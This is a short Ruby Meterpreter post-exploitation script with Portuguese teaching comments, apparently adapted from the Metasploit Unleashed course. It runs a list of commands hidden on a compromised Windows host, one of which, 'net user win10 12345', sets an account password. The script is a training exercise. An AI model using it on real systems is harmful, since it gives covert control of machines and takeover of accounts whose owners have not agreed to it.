#Editado por Joas, baseado no Metasploit Unleashed
#Upload do script na pasta /usr/share/metasploit-framework/scripts/meterpreter
#definimos uma função que aceita dois parâmetros, o segundo dos quais será uma matriz
def list_exec(session,cmdlst)
    print_status("Iniciando a lista de comandos ...")
    r=''
#Também é estabelecido um tempo limite para que a função não seja suspensa por nós
    session.response_timeout=120
    cmdlst.each do |cmd|
#Em seguida, configuramos um loop "for each" executado na matriz que é passada para a funçãi que pegará cada item na matriz
#E o executará no sistema por meio de cmd.exe /c (ele chama o comando sem a necessidade de abrir o prompt), imprimindo o status retornado da execução de comando
       begin
          print_status "iniciando comando #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("t#{d}")
          end
          r.channel.close
          r.close
#Por fim, um manipulador de erros é estabelecido para capturar quaisquer problemas que surjam durante a execução
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end
#Agora, configuramos uma matriz de comando, não esqueça do (,) após cada comando 
 commands = [ "set",
    "net user win10 12345",
	"dir",
    "other comando"]
#E aqui chamamos o comando
 list_exec(client,commands)